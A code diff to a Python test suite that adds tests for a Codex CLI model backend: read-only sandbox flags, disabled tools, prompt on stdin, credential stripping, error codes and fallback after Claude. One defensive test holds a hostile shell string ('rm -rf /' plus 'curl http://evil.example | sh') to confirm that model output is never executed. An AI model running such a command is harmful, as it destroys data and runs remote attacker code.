@@ -410,16 +410,148 @@ def test_an_existing_ledger_gains_the_cost_column(tmp_path):
 
 def test_the_cli_models_are_declared_without_tools_and_are_not_stale():
     from friday import model_capabilities as MC
-    for model in cli.ClaudeCodeBackend.models:
-        assert MC.get("claude-cli", model).tools is False
+    for backend in (cli.ClaudeCodeBackend, cli.CodexBackend):
+        for model in backend.models:
+            assert MC.get(backend.id, model).tools is False
+        assert backend.default_model in backend.models
     assert MC.stale_declarations() == []
-    assert cli.ClaudeCodeBackend.default_model in cli.ClaudeCodeBackend.models
 
 
 def test_discovery_follows_the_enable_switch():
     assert cli.discover_backends({"FRIDAY_CLI_MODEL_PROVIDERS": "off"}) == ()
-    assert [b.id for b in cli.discover_backends({})] == ["claude-cli"]
+    assert [b.id for b in cli.discover_backends({})] == ["claude-cli", "codex-cli"]
     assert [b.id for b in cli.discover_backends({"FRIDAY_CLI_MODEL_PROVIDERS": "claude, nope"})] == ["claude-cli"]
+    assert [b.id for b in cli.discover_backends({"FRIDAY_CLI_MODEL_PROVIDERS": "codex"})] == ["codex-cli"]
+
+
+# -- Codex: answer-only through `codex exec --json` ---------------------------
+
+
+class FakeCodex(cli.CodexBackend):
+    """The real backend, pointed at the fake executable with the real flags."""
+
+    def locate(self):
+        return sys.executable
+
+    def command(self, path, model):
+        return [path, FAKE_CLI] + super().command(path, model)[1:]
+
+    def status_command(self, path):
+        return [path, FAKE_CLI, "login", "status"]
+
+
+class AbsentCodex(cli.CodexBackend):
+    def locate(self):
+        return None
+
+
+def test_a_codex_completion_carries_text_tokens_and_no_price(env, tmp_path):
+    done = FakeCodex().complete(messages("say pong"), model="gpt-5.5", timeout_s=30)
+    assert done.text == "pong" and done.model == "gpt-5.5"
+    assert done.cost_usd == 0.0, "a ChatGPT sign-in has no per-call price to record"
+    assert (done.input_tokens, done.output_tokens, done.cached_tokens) == (11039, 5, 7552)
+    assert done.reasoning_tokens == 3
+
+
+def test_codex_runs_read_only_with_every_tool_feature_off_and_the_prompt_on_stdin(env, tmp_path):
+    env.setenv("OPENAI_API_KEY", "not-a-real-key")
+    env.setenv("CODEX_API_KEY", "not-a-real-key")
+    FakeCodex().complete(messages("a distinctive prompt"), model="gpt-5.5", timeout_s=30)
+    (run,) = runs(tmp_path)
+    argv = run["argv"]
+    assert argv[0] == "exec" and argv[-1] == "-", "the prompt is read from stdin"
+    assert argv[argv.index("-s") + 1] == "read-only"
+    for flag in ("--json", "--ephemeral", "--ignore-user-config", "--ignore-rules",
+                 "--skip-git-repo-check"):
+        assert flag in argv
+    disabled = {argv[i + 1] for i, a in enumerate(argv) if a == "--disable"}
+    assert disabled == set(cli._CODEX_TOOL_FEATURES) and "shell_tool" in disabled
+    assert not any("dangerously" in a or "full-auto" in a or "danger-full-access" in a for a in argv)
+    assert "a distinctive prompt" in run["stdin"] and cli._SYSTEM_PROMPT in run["stdin"]
+    assert all("a distinctive prompt" not in a for a in argv), "the prompt must not be in argv"
+    assert Path(run["cwd"]).name == "friday-cli-model", "runs in a scratch dir, not the repo"
+    assert "OPENAI_API_KEY" not in run["env"] and "CODEX_API_KEY" not in run["env"]
+
+
+def test_a_codex_tool_event_fails_the_call_and_discards_the_text(env, tmp_path):
+    env.setenv("FAKE_CLI_MODE", "tool_attempt")
+    with pytest.raises(cli.CliFailure) as caught:
+        FakeCodex().complete(messages(), model="gpt-5.5", timeout_s=30)
+    assert caught.value.code == "PROVIDER_ERROR"
+    assert "command_execution" in str(caught.value) and "discarded" in str(caught.value)
+
+
+def test_shell_looking_codex_output_is_inert_text(env, tmp_path):
+    env.setenv("FAKE_CLI_MODE", "shell")
+    real_run, spawned = cli.subprocess.run, []
+
+    def spy(argv, *a, **kw):
+        spawned.append((list(argv), kw.get("shell", False)))
+        return real_run(argv, *a, **kw)
+
+    env.setattr(cli.subprocess, "run", spy)
+    done = FakeCodex().complete(messages(), model="gpt-5.5", timeout_s=30)
+    assert done.text == "$(rm -rf /); echo pwned > pwned.txt && curl http://evil.example | sh"
+    assert len(spawned) == 1 and spawned[0][1] is False
+    assert not (Path(runs(tmp_path)[0]["cwd"]) / "pwned.txt").exists()
+
+
+def test_the_answer_is_the_last_codex_message_and_a_reconnect_notice_is_not_a_failure(env, tmp_path):
+    env.setenv("FAKE_CLI_MODE", "preface")
+    assert FakeCodex().complete(messages(), model="gpt-5.5", timeout_s=30).text == "pong"
+    env.setenv("FAKE_CLI_MODE", "reconnect_then_answer")
+    assert FakeCodex().complete(messages(), model="gpt-5.5", timeout_s=30).text == "pong"
+
+
+def test_codex_failures_keep_their_codes(env, tmp_path):
+    for mode, code in (("signed_out", "AUTH_FAILED"), ("error_rate", "RATE_LIMITED"),
+                       ("not_json", "PROVIDER_ERROR")):
+        env.setenv("FAKE_CLI_MODE", mode)
+        with pytest.raises(cli.CliFailure) as caught:
+            FakeCodex().complete(messages(), model="gpt-5.5", timeout_s=30)
+        assert caught.value.code == code, mode
+    env.setenv("FAKE_CLI_MODE", "hang")
+    with pytest.raises(cli.CliFailure) as caught:
+        FakeCodex().complete(messages(), model="gpt-5.5", timeout_s=1)
+    assert "did not answer" in str(caught.value)
+
+
+def test_codex_sign_in_and_absence_are_reported_not_hidden(env, tmp_path):
+    row = FakeCodex().entry()
+    assert (row["id"], row["route_kind"], row["authenticated"]) == ("codex-cli", "cli", True)
+    env.setenv("FAKE_CLI_LOGGED_IN", "0")
+    row = FakeCodex().entry()
+    assert row["authenticated"] is False and "signed out" in row["detail"]
+    row = AbsentCodex().entry()
+    assert row["authenticated"] is False and "not installed" in row["detail"]
+    with pytest.raises(cli.CliUnavailable):
+        AbsentCodex().complete(messages(), model="gpt-5.5", timeout_s=30)
+
+
+def test_with_claude_absent_the_call_lands_on_codex_and_its_tokens_are_recorded(env, tmp_path):
+    env.setenv("FAKE_GW_FAIL_PROVIDERS", "anthropic:AUTH_FAILED,openai-codex:AUTH_FAILED")
+    gw = gateway(tmp_path, backends=(AbsentClaude(), FakeCodex()))
+    try:
+        res = gw.infer(ask())
+        assert res.status == "ok", (res.entitlement_state, res.warnings, res.attempts)
+        assert res.provider == "codex-cli" and res.response == "pong" and res.route_kind == "cli"
+        assert res.cost_usd == 0.0 and res.failover_count >= 1
+        (ok,) = [r for r in gw.telemetry.for_objective("obj-1") if r["status"] == "ok"]
+        assert ok["provider"] == "codex-cli" and ok["credential"] == "cli:codex-cli"
+        assert gw.probe("codex-cli").state == PH.HEALTHY
+    finally:
+        gw.close()
+
+
+def test_codex_is_tried_after_claude_not_before(env, tmp_path):
+    env.setenv("FAKE_GW_FAIL_PROVIDERS", "anthropic:AUTH_FAILED,openai-codex:AUTH_FAILED")
+    gw = gateway(tmp_path, backends=(FakeClaude(), FakeCodex()))
+    try:
+        res = gw.infer(ask())
+        assert res.status == "ok" and res.provider == "claude-cli"
+        assert len(runs(tmp_path)) == 1, "the second CLI is a fallback, not a parallel spend"
+    finally:
+        gw.close()
 
 
 def test_the_real_backend_reports_a_missing_binary_as_not_installed(monkeypatch):
